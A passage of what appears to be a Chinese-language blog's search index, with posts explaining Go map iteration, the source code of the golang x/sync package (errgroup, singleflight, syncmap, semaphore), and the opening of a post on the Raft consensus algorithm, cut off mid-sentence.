的过程中向其写入新的键值对”这个行为是不确定的，而 hmap 的扩容只会发生在 mapassign 新增键值对时，所以如果要考虑 for-range 与扩容的关系，那么正常情况下只会有 map 处于扩容中的时候对其进行 for-range，而不会有 for-range 的过程中开始扩容。对于这种情况，mapiternext 的处理与 mapaccess2 类似，如果当前遍历的 bmap 链表没有完成迁移，那么去遍历迁移前的 bmap 链表，如果已经完成迁移，那么直接遍历新的 bmap 链表。 但由于 for-range 最终会遍历整个 map，所以如果在非 sameSizeGrow 的情况下单纯用这种方式是会有问题的，因为比如扩容前有 2 个 bmap 链表，扩容后有 4 个，那么 0 和 3 都对应原来的 0 号链表，而遍历后会分别扫过 0 和 3，如果判断原来的 0 没有做迁移，那么就会遍历两次 0 号链表，最终的结果就是部分键值对会出现两次。所以，mapiternext 在遍历时以新的 bmap 数组为准，假设当前遍历的新 bmap 链表为 a，那么如果对应的旧 bmap 链表还没有迁移，就会去遍历旧链表，然后 只返回那些迁移时会被移动到 a 中的键值对，下次遍历这个旧链表时再返回剩余的部分。 另外，和新增键值对不同，修改已有的键或删除某个键是被允许的，而这虽然不会引起扩容，但是会导致迁移。也就是说，有可能两次连续调用 mapiternext 来从同一个 bmap 结构中获取两个键值对，然后在调用之间修改了 map 中的键对应的值，或是直接删除了某个键，那么很可能在第一次调用时这个 bmap 还是未迁移的状态，而第二次调用时却是已经迁移的状态了。要解决这个这个问题也很简单，因为一旦某个 bmap 被迁移，那么它的 tophash 会是 evacuatedX 或 evacuatedY，此时只需要在遍历到这种键值对时 特殊处理 即可。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"golang x/sync 包源码解读","slug":"golang-sync-package","date":"2022-12-12T11:55:52.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/12/12/golang-sync-package/","link":"","permalink":"/2022/12/12/golang-sync-package/","excerpt":"","text":"前言golang 的 sync 和 sync/atomic 标准库中提供了很多并发编程相关的基础工具，基于这些基础工具可以向上封装一些更适用于应用场景的工具。比如 x/sync 包就提供了 errgroup、singleflight、syncmap 和 semaphore，其中 syncmap 在 go1.9 版本中已经进入了 sync 标准库中，被广泛应用在各种应用中。除此之外，我在工作中也使用过其中的 errgroup 和 singleflight。 为了更好地理解其中的原理，下面对这四种工具的源码进行解读，这篇博客假设读者已经掌握了这些工具的使用方法，如果有需要，读者可以通过点击上面的链接来查看各个工具的测试代码。 errgroup 源码：https://github.com/golang/sync/blob/master/errgroup/errgroup.go errgroup 整体而言比较简单，可以看作是 sync.WaitGroup 的升级版，所以能使用 sync.WaitGroup 的场景基本都可以用 errgroup 来代替。为了方便表述，后文将 sync.WaitGroup 均称为 wg，这也是我通常使用的该类型变量的变量名。 wg 适用于一个 goroutine 等待多个 goroutine 执行的场景，举例来说，我们作为服务端可能要给前端返回用户的详细个人信息，这些信息需要调用不同的 rpc 从不同的服务中获取，最终由请求的 handler 整合后返回。那么就可以提前生成一个响应结构，然后通过 wg 来启动多个 goroutine，每个 goroutine 负责请求不同的 rpc 并将结果填充进响应结构中，对于生成响应的 goroutine 而言只需要 wg.Wait()，当这个函数返回时就代表所有的子 goroutine 都结束执行了。 上面这个场景用代码表示的话，大概是这个样子： 1234567891011121314151617181920212223wg := new(sync.WaitGroup)wg.Add(1)go func() &#123; defer func() &#123; goRecover() wg.Done() &#125;() // do something&#125;()wg.Add(1)go func() &#123; defer func() &#123; goRecover() wg.Done() &#125;() // do something&#125;()// ...wg.Wait() 上面的代码有什么问题呢？首先，每个子 goroutine 都有一个 wg.Add(1) 和 wg.Done()，尽管可以只做一次 wg.Add(n)，但使用者需要正确地维护 wg.Add 和 wg.Done 的对应关系，如果 wg.Add 大于 wg.Done，那么 wg.Wait 就会卡死，反过来则会导致 panic；另一方面，子 goroutine 内部有可能会产生错误，但原生 wg 并不感知各个子 goroutine 是否正常结束，它甚至不感知子 goroutine 的存在；除此之外，除了 wg.Wait，各个 goroutine 并没有什么联系，原生 wg 并不能做到类似 “某个 goroutine 发生错误时就终止其他 goroutine” 的功能。 而这些在 errgroup 下都可以得到解决。errgroup 提供了一个名为 Group 的结构，该结构的定义是这样的： 123456789101112131415// A Group is a collection of goroutines working on subtasks that are part of// the same overall task.//// A zero Group is valid, has no limit on the number of active goroutines,// and does not cancel on error.type Group struct &#123; cancel func() wg sync.WaitGroup sem chan token errOnce sync.Once err error&#125; 可以看到在这个结构体中除 cancel 和 sem 外所有的字段都不是指针，而从我们后面的描述中就可以看到， 这两个字段并不是一定要有值才行。所以就像这个结构的注释一样，我们完全可以使用一个零值的 Group，因为此时强依赖的字段都已经是可使用的状态了。 和 wg 不同，Group 是感知子 goroutine 的存在的，它提供了 Go 和 TryGo 方法来做这件事。我们先看 Go 方法 ，此时先认为 cancel 和 sem 都为 nil，那么 Go 方法的定义就变得非常简单，它仅仅包装了 wg.Add(1) 和 wg.Done() 的过程，使用者此时便不再需要手动维护这两者的关系，只需要关注 func() error 内部的逻辑即可。而一旦这个作为入参的函数返回了错误，即 err 不为 nil，那么 Group 就会将这个返回的 err 赋值给内部的 err 字段。由于在赋值时使用了 errOnce，所以最终 Group.err 如果不为 nil，那么它就会是所有子 goroutine 中发生的第一个错误。 但 Group.err 的首字母是小写的，所以我们并没有办法直接访问这个变量，而是要用 Group.Wait 方法。该方法是 wg.Wait 的封装，在此基础上将 Group.err 返回，所以使用者就可以借此访问到子 goroutine 中的错误了。 到此为止，零值的 Group 已经解决了我们前面说的三个问题中的两个，那么最后一个问题要通过什么来解决呢？我们可以维护一个 channel，所有的子 goroutine 都在 select 中尝试从这个 channel 中读取或做实际的业务逻辑，一旦有某个 goroutine 遇到错误，就 close 这个 channel，那么其他的 goroutine 都会从这个 channel 中读取到内容，从而结束后序逻辑。 但是 Group 不是这样做的，它采用了 golang 中一个更接近应用场景的思维模式的工具，也就是 context。 我们前面讨论 Group 的基本功能时，是假设 cancel 和 sem 都是 nil 的。但如果 cancel 不为 nil，那么就可以做到当一个 goroutine 出错时，其他 goroutine 都提前返回的功能。Group 提供了 WithContext 方法 ，该方法调用 context.WithCancel 来包装外部传递的 ctx，并返回新的 ctx，这样这个新的 ctx 就可以以闭包的方式被 Group.Go 的入参函数所使用。 除了这些功能外，errgroup 还提供了限制并发数量的功能，该功能通过 SetLimit 方法 来实现。该方法接收一个整型数字作为最大并发度，该数字如果大于零，那么会作为 sem 这个 channel 的长度。Group.sem 的类型是 chan token，而 token 的定义是 type token struct{}。之所以要用 struct{}，是因为实际 Group 并不关注 sem 中保存的是什么，它只需要使用 sem 作为 channel 天然所拥有的阻塞能力，所以设置成 struct{} 就可以节省空间，因为该类型本身并不占用内存。errgroup 的限流采用了漏桶算法的思想，具体而言，如果 sem 不为 nil，那么 Group.Go 在执行前会尝试向 sem 写入一个 token，如果此时 sem 中保存的 token 已经达到了 Group.SetLimit 所设置的长度，那么新的写入会被阻塞直到 sem 内的某个 token 被释放。而 token 正是在 Group.done 方法 中被释放的，该方法在 Group.Go 的入参函数执行完成时就会被调用。 最后，Group 还提供了 TryGo 方法 来让使用方感知是否被限流。该方法和 Group.Go 方法的区别在于向 sem 中写入 token 的部分，通过 select-default 的方式来“浅尝辄止”：如果 g.sem &lt;- token{} 的部分不能成功，那么 select 会走到 default 的部分，并在这部分返回 false 表示因为被限流导致没能成功启动子 goroutine。 singleflight 源码：https://github.com/golang/sync/blob/master/singleflight/singleflight.go singleflight 提供了一种名为 “duplicate suppression” 的能力，这种能力非常适合用来处理缓存回源问题。举例来说，假设我们在应用中维护了一份 localcache，当用户通过发起请求来根据某个 key 获取对应的值时，应用首先在 localcache 中寻找，如果没有找到则回源到存储层中去寻找，并将找到的值或空值写回 localcache 以在下一次请求时避免回源。 在这个场景下，回源这个节点就成为了关键节点，因为当应用具备一定的并发量时，很有可能在同一时间会有多个针对同一个 key 的请求，而它们在读取 localcache 时均会发现其中没有自己需要的数据，从而进行回源，这时这些请求都会被漏放到存储层，从而使其瞬时压力升高，极端情况下可能会导致存储不可用。但实际上，这些发生在同一时间的回源请求读取存储时拿到的结果都是相同的，所以我们完全没必要将所有的请求都放到存储层。 这些不必要的回源请求，其实就是 duplicate 的，而 singleflight 要做的就是把这些不必要的请求拦截，只允许其中一个请求发生，其他请求直接读取这个请求返还的结果。 在 singleflight 包中，核心结构有如下三个： 123456789101112131415161718192021222324252627282930// call is an in-flight or completed singleflight.Do calltype call struct &#123; wg sync.WaitGroup // These fields are written once before the WaitGroup is done // and are only read after the WaitGroup is done. val interface&#123;&#125; err error // These fields are read and written with the singleflight // mutex held before the WaitGroup is done, and are read but // not written after the WaitGroup is done. dups int chans []chan&lt;- Result&#125;// Group represents a class of work and forms a namespace in// which units of work can be executed with duplicate suppression.type Group struct &#123; mu sync.Mutex // protects m m map[string]*call // lazily initialized&#125;// Result holds the results of Do, so they can be passed// on a channel.type Result struct &#123; Val interface&#123;&#125; Err error Shared bool&#125; 而这三个中，Group 又占主导位置，singleflight 提供的功能函数都要通过这个结构来调用。从代码中的注释可以看出，Group.m 是延迟初始化的，而 Group.mu 是一个值类型，所以和 errgroup.Group 相同，这个 Group 同样可以直接使用零值来完成一系列的功能。 首先，最核心的方法便是 Group.Do 方法，这个方法的一开始就通过 Group.mu 进行了加锁处理，而解锁部分有两处，分别对应两类 goroutine 进入这个方法的路径。区分这两类路径的核心在于 if c, ok := g.m[key]; ok { 这里，因为加了锁，所以这里不存在并发读的问题。如果这个 key 是第一次被使用，那么此时 g.m 中是不存在这个 key 的，所以此时会生成一个 call 结构并将其添加到 g.m 中，然后将 c.wg 通过 Add 增加 1 后调用 g.doCall 来尝试根据入参的 fn func() (interface{}, error) 获取结果。另一方面，如果这个 key 后续被其他 goroutine 使用时，前面提到的 if 就可以根据这个 key 从 g.m 中取出对应的 call，以从中直接获取结果。 我们先简单地将 doCall 理解为获取结果的方式，那么整个 singleflight 过程中有两点比较重要，首先是其他 goroutine 怎样才能知道这个 call 中的结果已经准备好了；另一方面，如果准备好了，负责 g.doCall 的 goroutine 是怎么把结果送给其他 goroutine 的。 从 Group 的定义中可以发现，Group.m 是一个 string 到 *call（指针） 的 map，这意味着不论哪个 goroutine 根据 key 从 Group.m 中拿到 call 结构都是同一个，所以任意一个 goroutine 对它的修改都能被其他 goroutine 所感知，这就解决了结果传递的问题，因为只要负责 g.doCall 的 goroutine 将结果写入 call.val 和 call.err，其他 goroutine 就可以从同一个 call 中读取这两个字段的结果。而前文所述的第一个问题也有很多解法（比如我们前面提到过的 close(channel) 的方法），不过在 singleflight 这个包中，是通过 WaitGroup 来实现的。具体而言，负责 g.doCall 的 goroutine 会对 call.wg 结构执行 Add 方法，而其他 goroutine 则对 call.wg 结构执行 Wait 方法。这样一旦 call.wg 的 Done 方法被调用，那么所有的 call.wg.Wait 都会返回，而由于 Done 是在 doCall 结束时 被调用的，所以此时其他 goroutine 就已经可以从 call.val 和 call.err 中拿到 doCall 的结果了。 同时，为了让使用者感知到是否有多个 goroutine 使用了同一个 call 结构，singleflight 在 call 中还维护了 dups 字段，该字段在 Group.Do 流程进入前文所述的 if 中时会被加一，所以只要在 Group.Do 返回时判断下 call.dups 是否大于 0 即可得知。 我个人认为 singleflight 对 WaitGroup 的应用还蛮有趣的，通常而言我对它的定位都是多个 goroutine 做 wg.Add 和 wg.Done，一个 goroutine 做 wg.Wait，而这里则是反过来的，通过多个 Wait 来实现多个 goroutine 等待一个 goroutine 的效果，这也说明了 wg.Wait 是幂等的。 和 Group.Do 方法类似，Group.DoChan 方法 也提供了 singleflight 的能力，只不过执行的结果是以 &lt;- chan Result 的方式返回的，从 Result 结构的定义可以看到，这个结构描述的其实就是 Group.Do 的返回值。所以 Group.DoChan 和 Group.Do 在原理上是基本相同的，唯一的区别在于结果的处理上，为了实现异步返回，Group.doCall 是以 goroutine 的方式来调用的，而每个请求 Group.DoChan 的 goroutine 都对应一个 &lt;- chan Result 结构，被保存在 call.chans 中，Group.doCall 会在获取到结果后依次将结果填充进 call.chans 中的每个元素中。这样 Group.DoChan 并不需要依赖 call.wg 来做 goroutine 间的结果同步，因为当 Group.doCall 结束时每个 goroutine 对应的 chan 中都能直接获取到结果。 所以由于 Group.m 这个 map 的存在，所有使用同样 key 的 goroutine 都可以从相同的 call 结构中获取到同一份结果。但是如果某个 key 一直存在于 Group.m 中，后续的所有针对这个 key 的 goroutine 都会不经过入参的 fn 的计算而直接从 call 中拿到旧的结果，这显然是不符合预期的，所以 key 一定是要被清理的。在 singleflight 中，Group.doCall 方法 会自动做 key 的清理，可以看到这里先判断了 Group.m[key] 是否是预期删除的 call，之所以这里要这样做，是因为 singleflight 还提供了 Group.Forget 方法来让使用者主动删除 Group.m 中的某个 key，而一旦这个方法被调用，紧随其后的第一个请求同一个 key 的 goroutine 就会向 Group.m 中填充新的 call 并再次调用 Group.doCall，此时 Group.m[key] 对于上一个调用 Group.doCall 的 goroutine 来说就是不该删除的了，因为现在的 call 与它毫无关系。 那么 Group.m 中某个 key 对应的 call 结构发生变化，是否会影响使用前一个 call 的那些 goroutine 们呢？答案是不会，因为它们在自己的函数栈中都创建了 c 变量，也就是上一个 call 的指针，就算其他的 goroutine 修改了 Group.m，这个 c 变量还是指向原来的 call 结构。我个人认为 singleflight 对 Group.m 的运用是非常有趣的，它在保存了旧 call 引用的同时还决定了当前的 goroutine 是否需要做 Group.doCall，非常棒。 除了删除 Group.m 中的 key，Group.doCall 主要做的就是调用入参的 fn，然后把结果填充进 call 中的 val、err、chans，这些在前面我们都已经讨论过了。除此之外，Group.doCall 还区分了 fn 内部是否发生了 panic 或 runtime.Goexit，这里做得也很巧妙，是用两个 defer 来做的，函数 最下面的代码 在 runtime.Goexit 时不会被执行，但 panic 却会执行，利用这一点就区分出了两种情况。 syncmap 源码：https://github.com/golang/sync/blob/master/syncmap/pre_go19.go 如前所述，syncmap 在 go1.9 时已经进入了标准库，所以我认为应该大多数的 gopher 都使用过这个工具。在 syncmap 中，核心的结构体有如下三个： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// Map is a concurrent map with amortized-constant-time loads, stores, and deletes.// It is safe for multiple goroutines to call a Map's methods concurrently.//// The zero Map is valid and empty.//// A Map must not be copied after first use.type Map struct &#123; mu sync.Mutex // read contains the portion of the map's contents that are safe for // concurrent access (with or without mu held). // // The read field itself is always safe to load, but must only be stored with // mu held. // // Entries stored in read may be updated concurrently without mu, but updating // a previously-expunged entry requires that the entry be copied to the dirty // map and unexpunged with mu held. read atomic.Value // readOnly // dirty contains the portion of the map's contents that require mu to be // held. To ensure that the dirty map can be promoted to the read map quickly, // it also includes all of the non-expunged entries in the read map. // // Expunged entries are not stored in the dirty map. An expunged entry in the // clean map must be unexpunged and added to the dirty map before a new value // can be stored to it. // // If the dirty map is nil, the next write to the map will initialize it by // making a shallow copy of the clean map, omitting stale entries. dirty map[interface&#123;&#125;]*entry // misses counts the number of loads since the read map was last updated that // needed to lock mu to determine whether the key was present. // // Once enough misses have occurred to cover the cost of copying the dirty // map, the dirty map will be promoted to the read map (in the unamended // state) and the next store to the map will make a new dirty copy. misses int&#125;// readOnly is an immutable struct stored atomically in the Map.read field.type readOnly struct &#123; m map[interface&#123;&#125;]*entry amended bool // true if the dirty map contains some key not in m.&#125;// An entry is a slot in the map corresponding to a particular key.type entry struct &#123; // p points to the interface&#123;&#125; value stored for the entry. // // If p == nil, the entry has been deleted and m.dirty == nil. // // If p == expunged, the entry has been deleted, m.dirty != nil, and the entry // is missing from m.dirty. // // Otherwise, the entry is valid and recorded in m.read.m[key] and, if m.dirty // != nil, in m.dirty[key]. // // An entry can be deleted by atomic replacement with nil: when m.dirty is // next created, it will atomically replace nil with expunged and leave // m.dirty[key] unset. // // An entry's associated value can be updated by atomic replacement, provided // p != expunged. If p == expunged, an entry's associated value can be updated // only after first setting m.dirty[key] = e so that lookups using the dirty // map find the entry. p unsafe.Pointer // *interface&#123;&#125;&#125; 其中最核心的就是 Map 这个结构，可以看到出了 Map.dirty 外其他的字段均是值类型，所以这个结构的零值也是可以直接被使用的。在 Map 中有 read 和 dirty 两个字段，其中 read 以 atomic.Value 的方式保存 readOnly 这个结构，可以看到 readOnly 中的 m 与 dirty 一样都是 map[interface{}]*entry 类型，而这里就是最终保存 k-v 映射关系的地方。 为什么要保存两份呢？很大程度上是为了效率，如果使用得当的话，大多数的读写请求都不需要依赖 Map.mu 这个锁来完成。具体来说，readOnly.m 的读写是通过 atomic 标准库提供的 Load/Store/CompareAndSwap 来做的，虽然我没有深入研究过这些操作的实现，但由于 sync.Mutex 和 sync.RWMutex 是通过 atomic 标准库来实现的，所以 atomic 一定是比 sync 标准库中的锁要高效的。 我个人觉得 readOnly 这个名字起得不好，因为它实际上是有写操作的，但 readOnly.m 仅仅是一个普通的 map，在并发读写时如果不加锁，golang 应该会检测到并报错退出才对。事实上，对于一个新的 key 而言，readOnly.m 并不存在类似 readOnly.m[key] = val 这样直接写入的操作，只会 对已经存在的 key 做更新操作，而这种操作并不会命中 golang map 的并发检测。对于那些新的 key，写入操作都只会发生在 dirty 中，所以在读取时如果 readOnly.m 中没有找到，就需要 到 dirty 中去尝试寻找。但是如果 readOnly.m 中没有需要的 key，也不是一定要去 dirty 中读取，这是通过 readOnly.amended 来实现的，当且仅当 dirty 中拥有 readOnly.m 中不存在的 key 时，这个字段才为 true。 通过阅读操作 dirty 的代码就会发现，它真的就只是一个普通的 map，而且存在向其中新增 key 的情况，这就不可避免地要在读写时进行加锁（也就是 Map.mu），而相较于使用 atomic 的 readOnly.m，这就变得非常低效了。所以 dirty 会在一定情况下升级为 readOnly.m，这是通过 Map.misssLocked 函数 来做的，在这个函数中会先增加 Map.misses 字段的值（函数被调用前加了锁，所以不会有并发增加的现象），当该字段的值大于等于 dirty 的长度时，就会执行升级操作。而这个函数只会在读取 dirty 时才会被调用，这样整体看来，就是每次读操作从 readOnly.m 穿透到 dirty 时就会算做一次 miss，而 miss 的次数大于等于 dirty 的长度时，就会将 dirty 升级为 readOnly，升级后的读操作相较于之前就会有所好转，因为新的 readOnly 拥有比之前更多的数据。 回到 readOnly.m 上，这个结构会经历的操作就只有读、更新以及替换整个 map，但是 Map.missLocked 函数在做完 readOnly 的升级后就 将 dirty 设置为 nil，那么当使用者继续向 dirty 中添加新的 key 时，dirty 中不就只有这些新添加的 key 了吗？如果读取这些新的 key 使 miss 达到阈值后发生升级，那么 readOnly 中原来的 key 不就消失了？事实上，当使用者 向值为 nil 的 dirty 中添加新的 key 时（也就是 readOnly.amended 为 false），会调用 Map.dirtyLocked 函数。可以发现，这个函数从 readOnly 中复制了所有值不为 nil 和 expunged 的 k-v（这里先不管这两种值的含义，后面讨论删除时会提到），所以此时 dirty 既包含 readOnly.m 中 “有效” 的 k-v，也包含新的 k-v，这样在升级时就不会丢失曾经的 key 了。同时，而由于 readOnly.m 和 dirty 中的值都是指针，所以实际上它们是共享同一份内存的，这一方面减小了空间开销，一方面又保证了一处的修改在另一处也能感知。 我们再来看看删除操作，也就是 Map.Delete 函数。这个函数的思路比较简单，如果 readOnly.m 中没有要删除的 key 而 readOnly.amended 为 true，那么 dirty 中就 “可能” 有要删除的 key，但是具体有没有，syncmap 并不关心，它直接就对 dirty 使用了 delete(m.dirty, key)，但这没有什么问题，因为用 delete 尝试从 map 中删除一个不存在 key 并不会报错。而如果 readOnly.m 中存在要被删除的 key，那么就会将其标记为 nil，这个 nil 在 dirty 被初始化时会在 readOnly.m 中 被替换成 expunged，而且不会出现在被初始化的 dirty 中。所以正如 注释 中所描述的，nil 和 expunged 都表示某个 key 被删除，如果 readOnly.m 中被删除的 key 表示为 nil，那么说明此时 dirty 为 nil，如果被删除的 key 表示为 expunged，那么 dirty 就不为 nil（不过如果硬要说的话，其实 这里 在e.unexpungeLocked 结束后 e.storeLocked 执行前对应的 key 就是 nil，此时 dirty 也不为 nil，不过只是一瞬间 :-P）。 所以对于删除这个操作而言，如果被删除的 key 在 readOnly.m 中可以被找到，那么这个删除其实是惰性的，它仅仅只是将 key 对应的值设置为 nil，直到 dirty 发生升级时，readOnly.m 整个被不存在这个 key 的 dirty 替换掉，这个删除才真正发生。在此之前，key 实际是存在于 readOnly.m 中的，只是读取时会 忽略那些值为 nil 或 expunged 的 key，营造出这个 key 不存在的假象。这在多数情况下不会有什么问题，但如果 key 是很占内存的类型，那这个删除也许并不符合应用的预期。 除了读写和删除外，syncmap 还支持 LoadOrStore、Range 等操作，原理和前面描述的差不多，其中 Range 操作除了提供遍历功能外，还能够 加速 dirty 到 readOnly.m 的升级，即只要 readOnly.amended 为 true，也就是 dirty 中存在 readOnly 中不存在的 key 时，就会做 dirty 的升级操作，而不管 Map.miss 是否达到阈值。 总的来说，syncmap 还是适合多读少写的场景，进一步的，如果是更新原值的写操作也没什么，但如果存在大量的新增 key 的写操作，那 syncmap 的性能其实并不高，因为这些新的 key 都会被放在 dirty 中，而读写 dirty 是要加锁的。除此之外，频繁地增加新的 key 还可能引发多次 dirty 的升级，而每次升级后再增加新的 key 时，都会发生新 dirty 的初始化，这会产生 O(n) 的复杂度，在 k-v 数量很多的情况下会进一步影响应用的性能。 semaphore 源码：https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/semaphore/semaphore.go semaphore 这个工具我本人并没有使用过，但因为它也被包含在 sync 包中，所以就一起研究下。这个包的代码相较于前面几个而言比较简单，核心的结构体有如下两个： 12345678910111213// Weighted provides a way to bound concurrent access to a resource.// The callers can request access with a given weight.type Weighted struct &#123; size int64 cur int64 mu sync.Mutex waiters list.List&#125;type waiter struct &#123; n int64 ready chan&lt;- struct&#123;&#125; // Closed when semaphore acquired.&#125; 其中功能函数都是由 Weighted 这个结构来使用的，和前面的三个工具不同，尽管 Weighted 是可导出的，但功能上要求 Weighted.size 字段的值是大于零的，而 size 是不可导出的，所以使用者需要调用 NewWeighted 方法 来创建 Weighted 类型的变量。 从源码来看，semaphore 想要做的是通过 Weighted 声明可以使用的最大资源量，提供 Weighted.Acquire 方法来获取定量的资源，如果目前没有足够量的资源，那么当前的 goroutine 会以上文 waiter 结构的形式被添加到一个链表里，当有可用资源时，这个 goroutine 就会被唤醒；而之所以会有可用的资源，是因为有些 goroutine 释放了之前申请的资源，这是通过 Weighted.Release 方法来做的。除此之外，该包还提供了 Weighted.TryAcquire 用于无阻塞地申请资源，这个方法和 Weighted.Acquire 的区别在于，当没有足够量的资源时这个函数会立即返回 false 表示资源获取失败，而不是将当前 goroutine 加入到 waiters 链表中。 为了做到有资源时唤醒 goroutine，每个 waiter 结构都有一个名为 ready 的只写的 channel，我没有看出这里设置成只写是有什么意义，因为 实际使用时 用的还是一个双向的 channel，当 goroutine 获取不到所需的资源量时，会使用 select 来从这个 channel 中尝试读取数据，以此实现阻塞。而当某个 goroutine 调用 Weighted.Release 释放资源时，会调用 Weighted.notifyWaiters 方法，按顺序遍历 waiters 链表中的各个 waiter，如果某个 waiter 所需的资源量已经可以获取到了，那么就调用 close(waiter.ready) ，这样对应的 goroutine 中的 select 就会结束，以此实现唤醒。 semaphore 的核心逻辑到此为止就结束了，但我们还能从中发掘一些其他的信息。首先是如果调用 Weighted.Acquire 时传递了一个比 Weighted.n（即资源的总量）还大的数字，那么 当前 goroutine 就会陷入阻塞，直到 &lt;-ctx.Done() 返回。但这就对 ctx 有了要求，它不能是 ctx.TODO() 或 ctx.Background()，因为这两个 ctx 的 Done 方法会返回一个 nil，而尝试从一个为 nil 的 channel 中读取数据会导致当前 goroutine 永远陷入阻塞。 另一方面，Weighted.waiters 是一个链表，而 Weighted.notifyWaiters 方法在被调用时会按序遍历这个链表尝试唤醒，遇到第一个不能唤醒的 goroutine 时，这个函数就退出了。这会导致什么问题呢？比如目前可用的资源量是 5，waiters 链表中各个 waiter 的 n 依次是 6, 1, 1, 1，实际上这个链表中的后三个 goroutine 都是可以被唤醒的，但因为第一个 goroutine 需要的资源量是 6，就导致后续的 goroutine 不会被扫描。关于这部分，注释中给出的解释是为了效率，因为 semaphore 中使用的链表操作的时间复杂度都是 O(1) 的，而如果使用小顶堆这类的结构，虽然可以尽可能唤醒那些被阻塞的 goroutine，但增删的时间复杂度是不及链表的。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 Raft 一致性算法","slug":"Raft","date":"2022-07-31T13:40:14.000Z","updated":"2022-12-29T05:40:57.525Z","comments":true,"path":"2022/07/31/Raft/","link":"","permalink":"/2022/07/31/Raft/","excerpt":"","text":"论文下载 前言2014年，一个名为 Raft 的算法被提出，这是一个以易于理解和方便实现为目的一致性算法。作者在同一年分别发表了名为 《In Search of an Understandable Consensus Algorithm》的论文，以及它的 Extended Version，较为详细地描述了 Raft。除此之外，作者的博士论文则以一个更详细的表述方式来描述了 Raft 的各个特性，所以 2014 年的版本被后人称为“ Raft 小论文”，本文就是小论文的阅读笔记与一些思考。 Raft 要解决什么问题在讨论 Raft 的特性前，我认为明确它要解决的问题是更重要的。首先，Raft 是一个一致性算法，这类算法服务于分布式场景，试图在集群中的成员间就某件事情达成一致。导致不一致的原因会有很多，较为常见的就是 CAP 中的 P，也就是网络分区。 举例来说，单 Leader 多 Follwer 的模式被很多分布式系统所采用，Follwer 多数负责分摊读取的流量，Leader 则负责写入。基于这个假设，底层存储的设计会变得简单，因为它只需要考虑来自一台机器的写流量即可。但是一旦 Leader 与 Follwer 之间出现网络分区，Follwer 们就会因为长时间收不到 Leader 的心跳而选出新的 Leader，此时整个系统就会出现两个 Leader，因为旧的 Leader 可能并没有意识到自己在其他机器看来是下线的状态，这被称为脑裂，是一种因为 Follower 和 Leader 间信息不一致而导致的现象。 所以，一致性算法的出现就是为了解决这类问题，即，在将网络分区或节点宕机等现象视为必然的条件下，保证节点间相互一致，对外继续提供稳定可靠的服务。而 Raft 就是这样的算法。 Raft 概述Raft 是一个非常依赖 Leader 的算法（论文中称之为 Strong leader），所以它本身就是一个单 Leader 多 Follower 的系统，和一般系统所不同的是，为了保证一致性，它的读写都需要通过 Leader 来进行。这个算法服务于分布式状态机，Leader 以日志的方式向 Follower 发送状态的变化，并以“所有节点中的大多数所达成的一致”作为整个系统的一致。也就是说，如果整个系统中有 3 个节点，那么只要 2 个节点达成一致，就认为整个系统是一致的，与之类似的，如果整个系统中有 5 个节点，那么至少需要有 3 个节点达成一致。反过来讲，5 个节点的系统最大可以容忍 2 个节点失效。 通常而言，Raft 的节点数是奇数，多为 3 个或 5 个，因为 Raft 其实是一个节点间通讯非常频繁的系统，它需要保证整个集群中的任意两个节点都可以发起 RPC 通信，所以如果集群中节点数量很多，那么节点间的 Raft 通信本身就是网络的一个压力来源。正是由于节点的数量并不多，所以采用 Raft 的系统并不会直接作为用户使用的大流量一致性存储系统，而是作为一个协调系统，帮助其他系统简单而可靠地达成一致。 节点状态与通信在 Raft 中，时间被划分为一个个任期，每个任期通过一个递增的数字来标明。Raft 的节点被分为三种状态，分别是 Leader，Follower 和 Candidate，各自的说明如下： Leader：整个系统的老大，客户端的读写都通过它来进行，应用层的状态由它说了算 Candidate：有机会成为老大 Follower：老大的小跟班，有时会成为 Candidate 三类节点的任意两两间都可以通过 RPC 进行交流。要想实现 Raft 的基本功能，只需要有两种 RPC，这两种 RPC 都会携带发送者认为的当前的任期号，仅当这个任期号大于等于接受者的任期号时，请求才被视为有效的。论文的 Figure2 中有两个 RPC 详细的参数说明，所以这里仅简单说明下对应的功能： AppendEntries：发送日志、说明已提交的日志位置、心跳检测，由 Leader 发起 RequestVote：发起投票，由 Candidate 发起 当一个节点刚刚加入到 Raft 集群中时，它的状态是 Follower，这种状态的节点会维护一个计时器，在计时器到期之前它需要收到来自 Leader 的 AppendEntries，如果成功收到，那么它会重置计时器，等待下一个 AppendEntries 的到来，这个状态会一直重复下去。另一方面，如果计时器到期，那么节点就从 Follower 转换为 Candidate。这时它会给自己投一票，然后对其他节点发出 RequestVote。如果它能够收到集群中大多数节点的认可，那么它的状态就会变为 Leader。Leader 节点负责与客户端通信，并将状态的变化以日志的方式通过 AppendEntries 发送给其他节点。 上面描述的是一般情况下节点的状态变化，但是如前所述，其实任意状态的两个节点都可以进行 RPC 交流。比如 Leader 在发送 AppendEntries 时并不区分接受者的状态，所以 Candidate 也是可以收到 AppendEntries；与之类似的，Candidate 在发送 RequestVote 时也不区分接受者的状态，所以 Leader 也可以收到 RequestVote。作为一个接受者，不论它收到的是什么 RPC，也不论它当前是什么状态，如果 RPC 参数中的任期号大于它当前所记录的任期号，那么它就会变为 Follower，因为集群中的有效任期号以节点中最大的那个为准，所以小于这个任期号的节点都被视为过期。 另一方面，当多个节点同时变为 Candidate 并发起 RequestVote 时，就很有可能无法选出 Leader。比如 5 个节点中有 4 个都变为 Candidate，那么它们会分别给自己投一票，但是 Raft 规定，每个节点在同一个任期中只可以给一个节点投票，所以不论最后的那个节点把票投给谁，集群中都最多只能达成“两个节点投票给同一个节点”，而这并不符合“大多数”的 3 个节点。所以为了避免这种情况，Raft 规定 Follower 的计时器时长应该为一定范围内的随机值，并且当 Follower 收到 AppendEntries 并重置计时器时，也会重新计算一个新的随机值，从而通过这种随机性来打散节点变为 Candidate 的时机，以尽量避免前文所述的多个节点同时变为 Candidate 的情况。 此外，作为一个分布式系统，支持节点的数量变化也是一种刚需。Raft 的很多机制都离不开“大多数”，但节点的变化就可能导致出现多个“大多数”。举例来说，一个 3 节点的 Raft 集群被增加为 5 个节点，那么这个增加操作也需要得到大多数节点的同意。我们将节点从 1～5 编号，假设前 3 个是原有的节点，4、5 是新加入的节点。那么很可能 2、3 是同意增加节点的，它们会和 4、5 一样，认为此时 3 个节点的一致性才是集群的一致性。但 1 